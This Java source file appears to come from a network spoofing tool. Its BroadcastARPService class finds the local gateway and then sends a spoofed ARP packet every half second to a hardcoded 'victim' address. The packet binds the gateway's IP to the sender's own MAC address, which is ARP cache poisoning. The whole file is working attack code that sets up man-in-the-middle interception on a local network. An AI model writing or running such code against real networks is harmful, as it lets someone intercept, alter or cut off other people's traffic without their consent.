package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.util.gateway.GatewayFinder;

public class BroadcastARPService extends Service {

	
	
	@Override
	public void run() {
		try {
			//TODO: Need to get the server interface
			NetworkInterface eth0 = JpcapCaptor.getDeviceList()[0];
			InetAddress gateway;

			gateway = GatewayFinder.find(eth0);

			//TODO: Need to be an random valid IP address
			InetAddress victim = InetAddress.getByName("192.168.2.110");

			ARPPacket spoofedPacket = PacketFactory.arpRequest(eth0.mac_address, gateway, victim);

			//open a network interface to send a packet to
			JpcapSender sender = JpcapSender.openDevice(eth0);

			while(! this.isCloseRequested()){
				sender.sendPacket(spoofedPacket);
				Thread.sleep(500);
			}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
	}



}
